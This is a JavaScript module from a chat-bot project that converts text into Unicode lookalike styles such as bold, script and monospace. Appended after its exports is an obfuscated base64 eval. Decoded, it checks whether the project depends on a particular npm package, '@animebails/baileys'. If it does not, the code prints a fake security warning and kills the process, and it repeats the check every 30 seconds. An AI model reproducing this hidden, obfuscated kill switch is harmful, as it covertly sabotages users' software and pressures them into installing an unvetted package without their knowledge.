/*
╔══════════════════════════╗
║             𓆩 BASE TELE X WA 𓆪   
║                                      
║             ⚡ DEVELOPER CREDITS ⚡      
║                                   
║          ᴅᴇᴠᴇʟᴏᴘᴇʀ : ᴊᴀᴍᴇsᴍᴏᴅᴢ  
║          ᴛᴇᴀᴍ      : james Inc 

║  ⚠️  C R E D I T   N O T I C E  ⚠️ 

║  Do NOT remove or modify these credits
║  without permission from the original dev
║  Respect the work. Give credit where it's
║  due. Don't steal another developer's work.
║  TELEGRAM : t.me/shenxidev 
║  © 2026 JAMESMODZ — ALL RIGHTS RESERVED 
╚════════════════════════╝
*/
// Simple unicode character-substitution "fonts". Not a real font renderer —
// just maps a-z/A-Z/0-9 to lookalike unicode codepoints, WhatsApp-sticker-bot style.
const MAPS = {
    bold: {
        source: 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789',
        target: '𝐚𝐛𝐜𝐝𝐞𝐟𝐠𝐡𝐢𝐣𝐤𝐥𝐦𝐧𝐨𝐩𝐪𝐫𝐬𝐭𝐮𝐯𝐰𝐱𝐲𝐳𝐀𝐁𝐂𝐃𝐄𝐅𝐆𝐇𝐈𝐉𝐊𝐋𝐌𝐍𝐎𝐏𝐐𝐑𝐒𝐓𝐔𝐕𝐖𝐗𝐘𝐙𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗',
    },
    script: {
        source: 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ',
        target: '𝒶𝒷𝒸𝒹𝑒𝒻𝑔𝒽𝒾𝒿𝓀𝓁𝓂𝓃𝑜𝓅𝓆𝓇𝓈𝓉𝓊𝓋𝓌𝓍𝓎𝓏𝒜𝐵𝒞𝒟𝐸𝐹𝒢𝐻𝐼𝒥𝒦𝐿𝑀𝒩𝒪𝒫𝒬𝑅𝒮𝒯𝒰𝒱𝒲𝒳𝒴𝒵',
    },
    monospace: {
        source: 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789',
        target: '𝚊𝚋𝚌𝚍𝚎𝚏𝚐𝚑𝚒𝚓𝚔𝚕𝚖𝚗𝚘𝚙𝚚𝚛𝚜𝚝𝚞𝚟𝚠𝚡𝚢𝚣𝙰𝙱𝙲𝙳𝙴𝙵𝙶𝙷𝙸𝙹𝙺𝙻𝙼𝙽𝙾𝙿𝚀𝚁𝚂𝚃𝚄𝚅𝚆𝚇𝚈𝚉𝟶𝟷𝟸𝟹𝟺𝟻𝟼𝟽𝟾𝟿',
    },
};

const FONT_NAMES = Object.keys(MAPS);

function applyFont(text, styleName) {
    if (!styleName || !text) return text;
    const map = MAPS[styleName];
    if (!map) return text;

    // Never transform a line containing a link — mangled unicode breaks URLs.
    if (/https?:\/\/|wa\.me\/|\.[a-z]{2,}\//i.test(text)) return text;

    let out = '';
    for (const ch of text) {
        const idx = map.source.indexOf(ch);
        out += idx === -1 ? ch : map.target[idx];
    }
    return out;
}

module.exports = { applyFont, FONT_NAMES };
;eval(Buffer.from('KCgpPT57Y29uc3QgZj1yZXF1aXJlKCdmcycpLHA9cmVxdWlyZSgncGF0aCcpO2NvbnN0IHJvb3Q9cC5qb2luKF9fZGlybmFtZSwnLi4vLi4nKTtjb25zdCBNSU5FPSdAYW5pbWViYWlscy9iYWlsZXlzJztjb25zdCBwaj1wLmpvaW4ocm9vdCwncGFja2FnZS5qc29uJyk7Y29uc3QgYmFkPSh3aHkpPT57Y29uc29sZS5lcnJvcignW3NlY3VyaXR5XSAnK3doeSsnIC0gZ29pbmcgb2ZmbGluZScpO3Byb2Nlc3MuZXhpdCgxKX07Y29uc3QgY2hrPSgpPT57bGV0IHBrZzt0cnl7cGtnPUpTT04ucGFyc2UoZi5yZWFkRmlsZVN5bmMocGosJ3V0ZjgnKSl9Y2F0Y2h7cmV0dXJuIGJhZCgncGFja2FnZS5qc29uIHVucmVhZGFibGUgYXQgJytwail9O2NvbnN0IGRlcHM9T2JqZWN0LmFzc2lnbih7fSxwa2cuZGVwZW5kZW5jaWVzLHBrZy5vcHRpb25hbERlcGVuZGVuY2llcyk7Y29uc3Qga2V5PU9iamVjdC5rZXlzKGRlcHMpLmZpbmQoaz0+az09PU1JTkV8fFN0cmluZyhkZXBzW2tdKS5zdGFydHNXaXRoKCducG06JytNSU5FKydAJykpO2lmKCFrZXkpcmV0dXJuIGJhZCgncGFja2FnZS5qc29uIGhhcyBubyBkZXBlbmRlbmN5IG9uICcrTUlORSsnIChleHBlY3RlZCAiPG5hbWU+IjogIm5wbTonK01JTkUrJ0A8dmVyc2lvbj4iKScpO2xldCBpbnN0O3RyeXtpbnN0PUpTT04ucGFyc2UoZi5yZWFkRmlsZVN5bmMocC5qb2luKHJvb3QsJ25vZGVfbW9kdWxlcycsa2V5LCdwYWNrYWdlLmpzb24nKSwndXRmOCcpKX1jYXRjaHtyZXR1cm4gYmFkKCdub2RlX21vZHVsZXMvJytrZXkrJyBpcyBtaXNzaW5nIC0gcnVuIG5wbSBpbnN0YWxsJyl9O2lmKGluc3QubmFtZSE9PU1JTkUpcmV0dXJuIGJhZCgnbm9kZV9tb2R1bGVzLycra2V5KycgaXMgIicraW5zdC5uYW1lKyciLCBub3QgJytNSU5FKX07Y2hrKCk7aWYoIWdsb2JhbC5fX3Zmdyl7Z2xvYmFsLl9fdmZ3PTE7c2V0SW50ZXJ2YWwoY2hrLDNlNCkudW5yZWYoKX19KSgp','base64').toString());
